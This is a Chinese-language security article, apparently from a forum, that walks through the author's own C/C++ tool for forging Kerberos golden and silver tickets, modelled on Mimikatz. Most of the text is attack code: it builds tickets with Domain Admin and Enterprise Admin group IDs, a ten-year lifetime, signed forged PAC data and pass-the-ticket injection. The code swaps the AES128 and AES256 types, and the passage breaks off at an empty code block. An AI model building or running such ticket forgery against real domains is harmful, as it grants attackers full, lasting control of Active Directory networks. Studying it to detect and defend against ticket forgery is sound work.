# How to Forge a Kerberos Ticket by Yourself

> **来源**: https://forum.butian.net/share/2460  
> **文章ID**: 2460

---

TL;DR
=====

票据伪造攻击是指攻击者通过伪造 Kerberos 票据来获取未经授权的访问权限。在这种攻击中，最常见的是伪造黄金票据（Golden Ticket）或白银票据（Silver Ticket）。

黄金票据攻击是一种高级的攻击技术，攻击者获取了域控制器的域控制器账户 Krbtgt 的 Long-term Key（长期密钥，一般是哈希值），可以使用此密钥伪造任意特权账户的 Ticket Granting Ticket（TGT），并为该 TGT 插入任意的特权属性证书（Privilege Attribute Certificate Data Structure，PAC）。黄金票证使攻击者能够为 Active Directory 中的任何帐户生成身份验证材料，并完全获取的域内访问权限。

使用黄金票证，攻击者仍需要与密钥分发中心（KDC）交互才能获得 TGS。而白银票据就是通过已获取的应用程序服务器的 Long-term Key，攻击者可以绕过 KDC 直接伪造 TGS 票据。伪造后的白银票据可以用来访问特定服务器上的服务或资源。

在过去一段时间中，我一直试图探索 Mimikatz 这款经典工具的内部实现，我主要围绕 Sekurlsa、Lsadump 和 Kerberos 这几个模块开始研究。这个过程需要反汇编以及调试，并且想达到 Mimikatz 的高度是非常困难的。但是，如果我们只是想实现 Mimikatz 的某些功能，或者基于其源代码构建自己的工具，那么这个过程非常值得尝试。

在本文中，我将通过自己构建的工具，探讨伪造 Kerberos 票据的主要细节，这同时包括 Golden Ticket 和 Silver Ticket，因为它们之间是相互关联的。我在自己构建的工具时，再次阅读了 “[*\[RFC4120\] The Kerberos Network Authentication Service (V5)*](https://www.ietf.org/rfc/rfc4120.txt)” 文档并参考了 Mimikatz 项目的源代码，使我对 Kerberos 协议的理解更加深入。在阅读源码时，我能够感受到 Mimikatz 项目的开发人员在其中投入了大量精力，因为其中涉及到许多未公开的结构。这里要感谢 Benjamin Delpy（[@gentilkiwi](https://twitter.com/gentilkiwi)） 以及 Vincent Le Toux（[@mysmartlogon](https://twitter.com/mysmartlogon)） 的杰出工作和辛苦付出。

Implemented By C/C++
====================

Main Function
-------------

主函数可以通过 `GetArgsByName()` 函数从命令行获取 `user`、`domain`、`service`、`target`、`sid` 以及 `rc4` 等主要参数，用于后续伪造票据，如下所示。

```c++
int wmain(int argc, wchar_t* argv[])
{
    LPCWSTR lpUser = NULL, lpDomain = NULL, lpService = NULL, lpTarget = NULL, lpKey = NULL, lpSid = NULL;
    BOOL isPtt = GetArgsByName(argc, argv, L"ptt", NULL, NULL);
    LONG dwKeyType = KERB_ETYPE_RC4_HMAC_NT;

    GetArgsByName(argc, argv, L"user", &lpUser, NULL);
    GetArgsByName(argc, argv, L"domain", &lpDomain, NULL);
    GetArgsByName(argc, argv, L"service", &lpService, NULL);
    GetArgsByName(argc, argv, L"target", &lpTarget, NULL);
    GetArgsByName(argc, argv, L"sid", &lpSid, NULL);

    if (GetArgsByName(argc, argv, L"rc4", &lpKey, NULL) || GetArgsByName(argc, argv, L"krbtgt", &lpKey, NULL))
        dwKeyType = KERB_ETYPE_RC4_HMAC_NT;
    if (GetArgsByName(argc, argv, L"des", &lpKey, NULL))
        dwKeyType = KERB_ETYPE_DES_CBC_MD5;
    if (GetArgsByName(argc, argv, L"aes128", &lpKey, NULL))
        dwKeyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
    if(GetArgsByName(argc, argv, L"aes256", &lpKey, NULL))
        dwKeyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
    GetArgsByName(argc, argv, L"rc4", &lpKey, NULL);

    // Do some initialization of the Kerberos authentication package
    if (!KerberosInit())
    {
        wprintf(L"[-] Failed to start kerberos initialization.\n");
        return -1;
    }

    if (!KerberosGolden(lpUser, lpDomain, lpService, lpTarget, lpKey, dwKeyType, lpSid, isPtt))
    {
        wprintf(L"[-] Failed.\n");
        return -1;
    }

    KerberosClean();
}
```

之后通过 `KerberosInit()` 函数进行 Kerberos 身份验证包的一些初始化工作。

Kerberos Init
-------------

`KerberosInit()` 函数定义如下，该函数主要 `LsaConnectUntrusted()` 函数与 LSA 服务器建立不受信任的连接，然后通过 `LsaLookupAuthenticationPackage()` 函数获取 Kerberos 身份验证包的唯一标识符并保存到 `AuthenticationPackage` 变量中。

```c++
LSA_STRING KerberosPackageName = { 8, 9, (PCHAR)MICROSOFT_KERBEROS_NAME_A };
ULONG   AuthenticationPackage = 0;
BOOL    isAuthPackageKerberos = FALSE;
HANDLE  hLSA = NULL;

BOOL KerberosInit()
{
    BOOL status = FALSE;
    // Open LSA policy handle
    status = NT_SUCCESS(LsaConnectUntrusted(&hLSA));
    if (status)
    {
        // Lookup authentication package ID
        status = NT_SUCCESS(LsaLookupAuthenticationPackage(hLSA, &KerberosPackageName, &AuthenticationPackage));
        isAuthPackageKerberos = status;
    }
    return status;
}
```

这里主要是为了后续伪造黄金票据后，通过 LsaCallAuthenticationPackage API 将伪造的票据提交到内存中，暂时用不到。

接下来将调用 `KerberosGolden()` 函数，执行票据伪造的过程，该函数定义如下。

```c++
BOOL KerberosGolden(LPCWSTR lpUser, LPCWSTR lpDomain, LPCWSTR lpService, LPCWSTR lpTarget, LPCWSTR lpKey, LONG dwKeyType, LPCWSTR lpSid, BOOL isPtt)
{
    BOOL status = FALSE;
    BYTE Key[AES_256_KEY_LENGTH] = { 0 };
    PWCHAR netbiosDomain = NULL;
    PISID pSid = NULL;
    PBERVAL BerAppKrbCred = NULL;
    KERBEROS_LIFETIME_DATA lifeTimeData;
    PKERB_ECRYPT pCSystem;

    // Intercept the NetBIOS Domain through the Domain provided by the user.
    // For example, get pentest via pentest.com.
    if (LPCWSTR baseDot = wcschr(lpDomain, L'.'))
    {
        DWORD i = (DWORD)((PBYTE)baseDot - (PBYTE)lpDomain);
        if (netbiosDomain = (PWCHAR)LocalAlloc(LPTR, i + sizeof(wchar_t)))
            for (DWORD j = 0; j < i / sizeof(wchar_t); j++)
                netbiosDomain[j] = towupper(lpDomain[j]);
    }
    // Find the encryption system of the dwKeyType type through the 
    // CDLocateCSystem function and store it in the pCSystem structure.
    status = NT_SUCCESS(CDLocateCSystem(dwKeyType, &pCSystem));
    if (!status)
    {
        wprintf(L"[-] CDLocateCSystem Error [%u].\n", GetLastError());
        return status;
    }
    // Convert user-supplied Long-term Key (NTLM) to Hex.
    if (StringToHex(lpKey, Key, pCSystem->KeySize))
    {
        // Generate three times for fake tickets: starttime, endtime and renew-till.
        GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
        *(PULONGLONG)&lifeTimeData.TicketStart -= *(PULONGLONG)&lifeTimeData.TicketStart % 10000000;
        lifeTimeData.TicketRenew = lifeTimeData.TicketEnd = lifeTimeData.TicketStart;
        *(PULONGLONG)&lifeTimeData.TicketEnd += (ULONGLONG)10000000 * 60 * wcstoul(L"5256000", NULL, 0);
        *(PULONGLONG)&lifeTimeData.TicketRenew += (ULONGLONG)10000000 * 60 * wcstoul(L"5256000", NULL, 0);
        wprintf(L"   User            : %s\n   Domain          : %s (%s)\n", lpUser, lpDomain, netbiosDomain);
    }
    // Convert user-supplied SID to PSID type.
    status = ConvertStringSidToSidW(lpSid, (PSID*)&pSid);
    if (!status)
    {
        wprintf(L"[-] ConvertStringSidToSidW Error [%u].\n", GetLastError());
        return status;
    }

    // Print some basic information.
    wprintf(L"   SID             : %s\n   User Id         : %u\n   Groups Id       : *513 512 520 518 519\n", lpSid, 500);
    wprintf(L"   ServiceKey      : ");  PrintfHex(Key, pCSystem->KeySize);  wprintf(L" - %s\n", TicketEtype(dwKeyType));
    if(lpService) wprintf(L"   Service         : %s\n", lpService);
    if(lpTarget) wprintf(L"   Target          : %s\n", lpTarget);
    wprintf(L"   Start Time      : ");
    DisplayLocalFileTime(&lifeTimeData.TicketStart); wprintf(L"\n");
    wprintf(L"   End Time        : ");
    DisplayLocalFileTime(&lifeTimeData.TicketEnd); wprintf(L"\n");
    wprintf(L"   Renew Until     : ");
    DisplayLocalFileTime(&lifeTimeData.TicketRenew); wprintf(L"\n");
    wprintf(L"   -> Ticket       : %s\n\n", isPtt ? L"** Pass The Ticket **" : L"ticket.kirbi");

    // Enter the KerberosGenerateGoldenData function to start forging tickets.
    BerAppKrbCred = KerberosGenerateGoldenData(lpUser, lpDomain, lpService, lpTarget, &lifeTimeData, Key, pCSystem->KeySize, dwKeyType, pSid, netbiosDomain);
    if (BerAppKrbCred == NULL)
    {
        wprintf(L"[-] Failed to generate kerberos golden data.\n");
        return NULL;
    }

    if (isPtt)
    {
        // Pass the ticket through the KerberosPTT function to submit the 
        // forged ticket into memory.
        status = KerberosPTT(BerAppKrbCred->bv_val, BerAppKrbCred->bv_len);
        if (!status)
        {
            wprintf(L"[-] Failed to pass the kerberos ticket.\n");
            return status;
        }
        wprintf(L"   * Golden ticket for '%s @ %s' successfully submitted for current session.\n", lpUser, lpDomain);
    }
    return status;
}
```

Initialize Secret Key and Set Ticket Time
-----------------------------------------

`KerberosGolden()` 函数首先通过 `CDLocateCSystem()` 函数找到 `dwKeyType` 参数指定的加密类型的加密系统，并存储在 `pCSystem` 结构体中。然后将用户提交的 Key 转换为大小为 `pCSystem->KeySize` 的 Hex 格式，如下所示。

```c++
status = NT_SUCCESS(CDLocateCSystem(dwKeyType, &pCSystem));
if (!status)
{
    wprintf(L"[-] CDLocateCSystem Error [%u].\n", GetLastError());
    return status;
}

if (StringToHex(lpKey, Key, pCSystem->KeySize))
{
    // ...
}
```

这里的 Key 也就是服务器的 Long-term Key（长期密钥），用于后续对 PAC 结构签名和加密票据的 EncTicketPart 部分，一般是服务器的哈希值。

然后，需要为伪造的票据设置三个时间：starttime、endtime 和 renew-till，分别对应票证有效的起始时间、票据将过期的时间和票证的绝对到期时间，如下所示。

```c++
GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
*(PULONGLONG)&lifeTimeData.TicketStart -= *(PULONGLONG)&lifeTimeData.TicketStart % 10000000;
lifeTimeData.TicketRenew = lifeTimeData.TicketEnd = lifeTimeData.TicketStart;
*(PULONGLONG)&lifeTimeData.TicketEnd += (ULONGLONG)10000000 * 60 * wcstoul(L"5256000", NULL, 0);
*(PULONGLONG)&lifeTimeData.TicketRenew += (ULONGLONG)10000000 * 60 * wcstoul(L"5256000", NULL, 0);
```

然后将上述信息全部传入 `KerberosGenerateGoldenData()` 函数，正式进入伪造票据的过程，该函数定义如下。

```c++
PBERVAL KerberosGenerateGoldenData(LPCWSTR lpUserName, LPCWSTR lpDomainName, LPCWSTR lpServiceName, LPCWSTR lpTargetName, PKERBEROS_LIFETIME_DATA pLifeTimeData, LPCBYTE Key, DWORD dwKeySize, DWORD dwKeyType, PISID pSid, LPCWSTR lpLogonDomainName)
{
    // A KERBEROS_TICKET structure is defined for temporary storage of ticket information.
    KERBEROS_TICKET ticket = { 0 };
    PKERB_VALIDATION_INFO pValidationInfo = NULL;
    PPACTYPE pacType = NULL;
    DWORD pacTypeSize = 0;
    LONG SignatureType;
    PBERVAL BerAppEncTicketPart = NULL, BerAppKrbCred = NULL;

    // These three times for temporarily storing tickets: starttime, endtime and renew-till.
    ticket.StartTime = pLifeTimeData->TicketStart;
    ticket.EndTime = pLifeTimeData->TicketEnd;
    ticket.RenewUntil = pLifeTimeData->TicketRenew;

    // The cname of the temporary storage ticket.
    if (ticket.ClientName = (PKERB_EXTERNAL_NAME)LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME)))
    {
        ticket.ClientName->NameCount = 1;
        ticket.ClientName->NameType = KRB_NT_PRINCIPAL;
        RtlInitUnicodeString(&ticket.ClientName->Names[0], lpUserName);
    }

    // The sname of the temporary storage ticket.
    if (ticket.ServiceName = (PKERB_EXTERNAL_NAME)LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME)))
    {
        ticket.ServiceName->NameCount = 2;
        ticket.ServiceName->NameType = KRB_NT_SRV_INST;
        RtlInitUnicodeString(&ticket.ServiceName->Names[0], lpServiceName ? lpServiceName : L"krbtgt");
        RtlInitUnicodeString(&ticket.ServiceName->Names[1], lpTargetName ? lpTargetName : lpDomainName);
    }

    RtlInitUnicodeString((PUNICODE_STRING) & ticket.DomainName, lpDomainName);
    // The crealm，realm of the temporary storage ticket.
    ticket.TargetDomainName = ticket.AltTargetDomainName = ticket.DomainName;
    // The flags of the temporary storage ticket.
    ticket.TicketFlags = (lpServiceName ? 0 : KERB_TICKET_FLAGS_initial) | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable;
    // The tkt-vno of the temporary storage ticket.
    ticket.TicketKvno = 5;
    // The key (session key) of the temporary storage ticket.
    ticket.TicketEncType = ticket.KeyType = dwKeyType;
    ticket.Key.Length = dwKeySize;
    if (ticket.Key.Value = (PUCHAR)LocalAlloc(LPTR, ticket.Key.Length))
        // Generate a random session key.
        CDGenerateRandomBits(ticket.Key.Value, ticket.Key.Length);

    // Select an appropriate signature type according to dwKeyType for 
    // subsequent signing of the pac structure.
    switch (dwKeyType)
    {
    case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:
        SignatureType = KERB_CHECKSUM_HMAC_SHA1_96_AES128;
        break;
    case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:
        SignatureType = KERB_CHECKSUM_HMAC_SHA1_96_AES256;
        break;
    case KERB_ETYPE_DES_CBC_MD5:
        SignatureType = KERB_CHECKSUM_DES_MAC;
        break;
    case KERB_ETYPE_RC4_HMAC_NT:
    default:
        SignatureType = KERB_CHECKSUM_HMAC_MD5;
    }

    // Enter the GenerateValidationInfo function to generate a KERB_VALIDATION_INFO 
    // type buffer for PAC.
    if (pValidationInfo = GenerateValidationInfo(&pLifeTimeData->TicketStart, lpUserName, lpDomainName, lpLogonDomainName, pSid))
    {
        // Build the PAC structure through the generated KERB_VALIDATION_INFO buffer.
        if (ValidationInfoToPAC(pValidationInfo, SignatureType, &pacType, &pacTypeSize))
        {
            wprintf(L"    * PAC generated.\n");
            // Sign the constructed PAC structure
            if (GeneratePacSignatureData(pacType, pacTypeSize, SignatureType, Key, dwKeySize))
            {
                wprintf(L"    * PAC signed.\n");
            }
        }       
    }

    // Generate the EncTicketPart part of the ticket.
    if (BerAppEncTicketPart = GenerateAppEncTicketPart(&ticket, pacType, pacTypeSize))
    {
        wprintf(L"    * EncTicketPart generated.\n");
        // Encrypt the generated EncTicketPart, which uses the long-term key of 
        // the kdc/application server.
        if (KerberosEncrypt(dwKeyType, KRB_KEY_USAGE_AS_REP_TGS_REP, Key, dwKeySize, BerAppEncTicketPart->bv_val, BerAppEncTicketPart->bv_len, (LPVOID*)&ticket.EncTicketPart.Value, &ticket.EncTicketPart.Length, TRUE))
        {
            wprintf(L"    * EncTicketPart encrypted.\n");
            // Construct the KRB_CRED structure data and embed the generated ticket in it.
            if (BerAppKrbCred = GenerateAppKrbCred(&ticket))
            {
                wprintf(L"    * KrbCred generated.\n\n");
            }
        }       

        // Print some basic information.
        wprintf(L"   Client Name     : %wZ @ %wZ\n", &ticket.ClientName->Names, &ticket.AltTargetDomainName);
        wprintf(L"   Service Name    : %wZ @ %wZ\n", &ticket.ServiceName->Names, &ticket.DomainName);
        wprintf(L"   Target Name     : %wZ @ %wZ\n", &ticket.ServiceName->Names, &ticket.TargetDomainName);
        wprintf(L"   Encryption Type : %s", TicketEtype(ticket.KeyType)); wprintf(L"\n");
        wprintf(L"   Session Key     : ");
        PrintfHex(ticket.Key.Value, ticket.Key.Length); wprintf(L"\n");
        wprintf(L"   Flags %08x  : ", ticket.TicketFlags);
        DisplayFlags(ticket.TicketFlags); wprintf(L"\n");
        wprintf(L"   Start Time      : ");
        DisplayLocalFileTime((PFILETIME)&ticket.StartTime); wprintf(L"\n");
        wprintf(L"   End Time        : ");
        DisplayLocalFileTime((PFILETIME)&ticket.EndTime); wprintf(L"\n");
        wprintf(L"   Renew Until     : ");
        DisplayLocalFileTime((PFILETIME)&ticket.RenewUntil); wprintf(L"\n\n");
    }

    LocalFree(ticket.EncTicketPart.Value);
    ber_bvfree(BerAppEncTicketPart);

    if (pacType)
        LocalFree(pacType);
    if (pValidationInfo)
        LocalFree(pValidationInfo);
    if (ticket.Key.Value)
        LocalFree(ticket.Key.Value);
    if (ticket.ClientName)
        LocalFree(ticket.ClientName);
    if (ticket.ServiceName)
        LocalFree(ticket.ServiceName);

    return BerAppKrbCred;
}
```

Initialize Ticket Datas
-----------------------

在 `KerberosGenerateGoldenData()` 函数中，首先定义了一个 `KERBEROS_TICKET` 结构体 `ticket`，如下所示。

```c++
typedef struct _KERBEROS_TICKET {
    PKERB_EXTERNAL_NAME ServiceName;
    LSA_UNICODE_STRING  DomainName;
    PKERB_EXTERNAL_NAME TargetName;
    LSA_UNICODE_STRING  TargetDomainName;
    PKERB_EXTERNAL_NAME ClientName;
    LSA_UNICODE_STRING  AltTargetDomainName;

    LSA_UNICODE_STRING  Description;

    FILETIME            StartTime;
    FILETIME            EndTime;
    FILETIME            RenewUntil;

    LONG                KeyType;
    KERBEROS_BUFFER     Key;

    ULONG               TicketFlags;
    LONG                TicketEncType;
    ULONG               TicketKvno;
    KERBEROS_BUFFER     EncTicketPart;
} KERBEROS_TICKET, * PKERBEROS_TICKET;
```

然后将票据中的各种数据暂时存储在该结构中，包括票据中的服务名称、域名、服务主体名称、客户端名称、票据生效时间、票据过期时间、票据绝对过期时间、会话密钥、票据标志以及 EncTicketPart 序列的加密编码等，如下所示。

```c++
ticket.StartTime = pLifeTimeData->TicketStart;
ticket.EndTime = pLifeTimeData->TicketEnd;
ticket.RenewUntil = pLifeTimeData->TicketRenew;

if (ticket.ClientName = (PKERB_EXTERNAL_NAME)LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME)))
{
    ticket.ClientName->NameCount = 1;
    ticket.ClientName->NameType = KRB_NT_PRINCIPAL;
    RtlInitUnicodeString(&ticket.ClientName->Names[0], lpUserName);
}

if (ticket.ServiceName = (PKERB_EXTERNAL_NAME)LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME)))
{
    ticket.ServiceName->NameCount = 2;
    ticket.ServiceName->NameType = KRB_NT_SRV_INST;
    RtlInitUnicodeString(&ticket.ServiceName->Names[0], lpServiceName ? lpServiceName : L"krbtgt");
    RtlInitUnicodeString(&ticket.ServiceName->Names[1], lpTargetName ? lpTargetName : lpDomainName);
}

RtlInitUnicodeString((PUNICODE_STRING) & ticket.DomainName, lpDomainName);
ticket.TargetDomainName = ticket.AltTargetDomainName = ticket.DomainName;
ticket.TicketFlags = (lpServiceName ? 0 : KERB_TICKET_FLAGS_initial) | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable;
ticket.TicketKvno = 5;
ticket.TicketEncType = ticket.KeyType = dwKeyType;
ticket.Key.Length = dwKeySize;
if (ticket.Key.Value = (PUCHAR)LocalAlloc(LPTR, ticket.Key.Length))
    CDGenerateRandomBits(ticket.Key.Value, ticket.Key.Length);    // 生成一个随机的会话密钥
```

然后，根据用户提供的加密类型参数，选择一个合适的签名加密类型并保存在 `SignatureType` 变量中，用于后面对 PAC 结构进行签名：

```c++
switch (dwKeyType)
{
    case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:
        SignatureType = KERB_CHECKSUM_HMAC_SHA1_96_AES128;
    break;
    case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:
        SignatureType = KERB_CHECKSUM_HMAC_SHA1_96_AES256;
        break;
    case KERB_ETYPE_DES_CBC_MD5:
        SignatureType = KERB_CHECKSUM_DES_MAC;
        break;
    case KERB_ETYPE_RC4_HMAC_NT:
    default:
        SignatureType = KERB_CHECKSUM_HMAC_MD5;
}
```

接下来将进入生成并签名 PAC 结构的过程。

Generate and Sign PAC Type
--------------------------

Kerberos 作为一种身份验证服务，提供了一种验证网络主体身份的方法。身份验证通常主要用作授权过程的第一步，确定客户端是否可以使用服务、允许客户端访问哪些对象以及每个对象允许的访问类型。

但是，Kerberos 本身不提供授权。拥有服务的客户端票据仅提供客户端对该服务的身份验证，并且在没有单独的授权过程的情况下，应用程序不应认为它授权使用该服务。

因此，微软创建了特权属性证书（Privilege Attribute Certificate Data Structure，PAC），为 Kerberos 协议扩展提供授权数据。

PAC 结构将授权信息编码后嵌入票据的 `AuthorizationData` 结构中，其中包括组成员身份、附加凭据信息、配置文件和策略信息以及支持安全元数据。

### PAC

PAC 的结构如下图所示。

![](images/attach-067ce8dd0c78c7ec3c36c55cd3a9616cacd6467c.png)

其中，`AuthorizationData` 元素是一个 `AD-IF-RELEVANT` 类型，作为 PAC 最外层的包装器。它封装了 `AD-WIN2K-PAC` 类型的另一个 `AuthorizationData` 元素，该结构内部是 `PACTYPE` 结构，它充当实际 PAC 结构的标头。紧接着 `PACTYPE` 标头的是一系列 `PAC_INFO_BUFFER` 结构，这些 `PAC_INFO_BUFFER` 结构充当指向此标头后面的 PAC 内容的指针。

上图说明了 `AuthorizationData` 元素的构造方式 ，该元素以一组连续的结构开始，但元素的其余部分由数据块驻留的空间组成。这些块由初始连续结构（如图中的类型 1、6 和 C 块）或另一个块（如类型 C 数据块引用的数据块）中的指针引用。该空间中的数据块不会重叠，但不必是连续的或以任何特定顺序。

### PACTYPE

PACTYPE 结构是 PAC 的最顶层结构，指定 PAC\_INFO\_BUFFER 数组中的元素数量。PACTYPE 结构充当完整 PAC 数据的标头，其结构定义如下。

```c++
typedef struct _PACTYPE {
    ULONG cBuffers;
    ULONG Version;
    PAC_INFO_BUFFER Buffers[1];
} PACTYPE, *PPACTYPE;
```

- cBuffers：定义 Buffers 数组中的条目数。
- Version：定义PAC版本，必须是 0x00000000。
- Buffers：PAC\_INFO\_BUFFER 结构的数组。

PAC 的实际内容连续放置在 PAC\_INFO\_BUFFER 结构的变量集之后，内容是单独序列化的 PAC 元素，所有 PAC 元素必须放置在 8 字节边界上。

### PAC\_INFO\_BUFFER

PACTYPE 结构后面是 PAC\_INFO\_BUFFER 结构数组，每个结构定义 PAC 缓冲区的类型和字节偏移量，该结构定义如下。PAC\_INFO\_BUFFER 数组没有定义的顺序。因此，PAC\_INFO\_BUFFER 缓冲区的顺序没有意义。然而，一旦生成了 KDC 签名和服务器签名，缓冲区的顺序就不得更改，否则 PAC 内容的签名验证将会失败。

```c++
typedef struct _PAC_INFO_BUFFER {
    ULONG ulType;
    ULONG cbBufferSize;
    ULONG64 Offset;
} PAC_INFO_BUFFER, *PPAC_INFO_BUFFER;
```

- ulType：描述 Offset 处包含的缓冲区中存在的数据类型。
- cbBufferSize：包含 PAC 中位于 Offset 处的缓冲区的大小。
- Offset：包含从 PACTYPE 结构的开头到缓冲区开头的偏移量，数据偏移量必须是 8 的倍数。

具体的 ulType 类型如下表所示。

| Value | Meaning |
|---|---|
| 0x00000001 | Logon information . PAC structures MUST contain one buffer of this type. Additional logon information buffers MUST be ignored. |
| 0x00000002 | Credentials information . PAC structures SHOULD NOT contain more than one buffer of this type, based on constraints specified in section 2.6. Second or subsequent credentials information buffers MUST be ignored on receipt. |
| 0x00000006 | Server checksum . PAC structures MUST contain one buffer of this type. Additional logon server checksum buffers MUST be ignored. |
| 0x00000007 | KDC (privilege server) checksum (section 2.8). PAC structures MUST contain one buffer of this type. Additional KDC checksum buffers MUST be ignored. |
| 0x0000000A | Client name and ticket information . PAC structures MUST contain one buffer of this type. Additional client and ticket information buffers MUST be ignored. |
| 0x0000000B | Constrained delegation information . PAC structures MUST contain one buffer of this type for Service for User to Proxy (S4U2proxy) \[MS-SFU\] requests and none otherwise. Additional constrained delegation information buffers MUST be ignored. |
| 0x0000000C | User principal name (UPN) and Domain Name System (DNS) information . PAC structures SHOULD NOT contain more than one buffer of this type. Second or subsequent UPN and DNS information buffers MUST be ignored on receipt. |
| 0x0000000D | Client claims information . PAC structures SHOULD NOT contain more than one buffer of this type. Additional client claims information buffers MUST be ignored. |
| 0x0000000E | Device information . PAC structures SHOULD NOT contain more than one buffer of this type. Additional device information buffers MUST be ignored. |
| 0x0000000F | Device claims information . PAC structures SHOULD NOT contain more than one buffer of this type. Additional device claims information buffers MUST be ignored. |
| 0x00000010 | Ticket checksum PAC structures SHOULD NOT contain more than one buffer of this type. Additional ticket checksum buffers MUST be ignored. |

下面简单介绍几个 PAC 结构中必须存在的缓冲区数据类型。

### KERB\_VALIDATION\_INFO

KERB\_VALIDATION\_INFO 结构定义了由域控制器提供的用户登录和授权信息，该结构的指针被序列化为字节数组，然后放置在顶级 PACTYPE 结构的 Buffers 数组之后，放置的偏移量由对应的 PAC\_INFO\_BUFFER 结构的 Offset 字段指定。对应的 PAC\_INFO\_BUFFER 结构的 ulType 字段设置为0x00000001。

PAC 验证身份的主要实现就是依靠这个 KERB\_VALIDATION\_INFO 结构，其定义如下。

```c++
typedef struct _KERB_VALIDATION_INFO {
    FILETIME LogonTime;
    FILETIME LogoffTime;
    FILETIME KickOffTime;
    FILETIME PasswordLastSet;
    FILETIME PasswordCanChange;
    FILETIME PasswordMustChange;
    RPC_UNICODE_STRING EffectiveName;
    RPC_UNICODE_STRING FullName;
    RPC_UNICODE_STRING LogonScript;
    RPC_UNICODE_STRING ProfilePath;
    RPC_UNICODE_STRING HomeDirectory;
    RPC_UNICODE_STRING HomeDirectoryDrive;
    USHORT LogonCount;
    USHORT BadPasswordCount;
    ULONG UserId;
    ULONG PrimaryGroupId;
    ULONG GroupCount;
    [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;
    ULONG UserFlags;
    USER_SESSION_KEY UserSessionKey;
    RPC_UNICODE_STRING LogonServer;
    RPC_UNICODE_STRING LogonDomainName;
    PISID LogonDomainId;
    ULONG Reserved1[2];
    ULONG UserAccountControl;
    ULONG SubAuthStatus;
    FILETIME LastSuccessfulILogon;
    FILETIME LastFailedILogon;
    ULONG FailedILogonCount;
    ULONG Reserved3;
    ULONG SidCount;
    [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;
    PISID ResourceGroupDomainSid;
    ULONG ResourceGroupCount;
    [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;
} KERB_VALIDATION_INFO, *PKERB_VALIDATION_INFO;
```

其中的 GroupIds 这个成员是指向 `GROUP_MEMBERSHIP` 结构列表的指针，该列表包含域中帐户所属的组。如果我们可以修改 GroupIds 成员，将其修改为特权组，那么就可以达到域内账户提权的效果，比如众所周知的 MS14-068 漏洞。

不过，为了防止 PAC 内容被篡改，微软后来在 PAC 结构中加入了服务器检验和（Server Checksum） 与 KDC 校验和（KDC Checksum），他们对应的 PAC\_INFO\_BUFFER 结构的 ulType 字段分别为 0x00000007 和 0x00000006。

前文中，`KerberosGenerateGoldenData()` 中调用的 `GenerateValidationInfo()` 函数的主要作用就是生成一个 `KERB_VALIDATION_INFO` 结构并保存在 `pValidationInfo` 变量中，以便后续插入到 PAC 结构中，如下所示。

```c++
PKERB_VALIDATION_INFO GenerateValidationInfo(PFILETIME pAuthtime, LPCWSTR lpUserName, LPCWSTR lpDomainName, LPCWSTR lpLogonDomainName, PISID pSid)
{
    PKERB_VALIDATION_INFO pValidationInfo = NULL;
    GROUP_MEMBERSHIP defaultGroups[] = { {513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES}, };
    PGROUP_MEMBERSHIP pDefaultGroups = (PGROUP_MEMBERSHIP)LocalAlloc(LPTR, sizeof(defaultGroups));
    RtlCopyMemory(pDefaultGroups, defaultGroups, sizeof(defaultGroups));
#define NEVERTIME(filetime) (*(PLONGLONG) filetime = MAXLONGLONG)
    if (pValidationInfo = (PKERB_VALIDATION_INFO)LocalAlloc(LPTR, sizeof(KERB_VALIDATION_INFO)))
    {
        pValidationInfo->LogonTime = *pAuthtime;
        // The values of the five timestamp member variables are all set to a 
        // constant MAXLONGLONG representing the maximum possible time in the future.
        NEVERTIME(&pValidationInfo->LogoffTime);
        NEVERTIME(&pValidationInfo->KickOffTime);
        NEVERTIME(&pValidationInfo->PasswordLastSet);
        NEVERTIME(&pValidationInfo->PasswordCanChange);
        NEVERTIME(&pValidationInfo->PasswordMustChange);
        RtlInitUnicodeString((PUNICODE_STRING)&pValidationInfo->EffectiveName, lpUserName);
        pValidationInfo->UserId = 500;
        pValidationInfo->PrimaryGroupId = defaultGroups[0].RelativeId;
        pValidationInfo->GroupCount = ARRAYSIZE(defaultGroups);
        pValidationInfo->GroupIds = pDefaultGroups;
        if (lpLogonDomainName)
            RtlInitUnicodeString((PUNICODE_STRING)&pValidationInfo->LogonDomainName, lpLogonDomainName);
        pValidationInfo->LogonDomainId = pSid;
        pValidationInfo->UserAccountControl = USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
        pValidationInfo->SidCount = 0;
        pValidationInfo->ExtraSids = NULL;
    }
    return pValidationInfo;
}
```

### PAC\_CLIENT\_INFO

PAC\_CLIENT\_INFO 结构是 PAC 的可变长度缓冲区，包含客户端的名称和认证时间，该结构定义如下。

```c++
typedef struct _PAC_CLIENT_INFO {
    FILETIME ClientId;
    USHORT NameLength;
    WCHAR Name[1];
} PAC_CLIENT_INFO, *PPAC_CLIENT_INFO;
```

它用于验证 PAC 与票据的客户端相对应。PAC\_CLIENT\_INFO 结构直接放置在顶级 PACTYPE 结构的 Buffers 数组之后，放置的偏移量由对应的 PAC\_INFO\_BUFFER 结构的 Offset 字段指定。对应的 PAC\_INFO\_BUFFER 结构的 ulType 字段设置为 0x0000000A。

### PAC\_SIGNATURE\_DATA

有两个 PAC\_SIGNATURE\_DATA 结构必须被附加到 PAC 中，分别用于存储服务器签名和 KDC 签名信息，该结构定义如下。

```c++
